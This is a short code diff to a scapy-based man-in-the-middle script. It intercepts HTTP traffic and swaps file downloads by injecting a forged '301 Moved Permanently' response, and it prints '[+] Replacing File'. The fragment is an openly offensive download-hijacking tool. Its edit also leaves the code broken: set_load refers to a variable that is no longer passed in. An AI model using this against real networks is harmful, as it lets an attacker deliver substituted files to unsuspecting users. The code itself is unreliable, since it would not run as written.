@@ -5,8 +5,8 @@ import scapy.all as scapy
 #list for acknowledged field in packet
 ack_list = []
 
-def set_load():
-    scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: www.microsoft.com\n\n"
+def set_load(packet, load):
+    packet[scapy.Raw].load = load
 #del and scapy will auto complete for each modified packet
     del scapy_packet[scapy.IP].len
     del scapy_packet[scapy.IP].chksum
@@ -31,6 +31,7 @@ def process_packet(packet):
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing File")
                 
+
 #set scapy_packet to a string and set payload which will save the packet
                 packet.set_payload(str(scapy_packet))
     packet.accept()
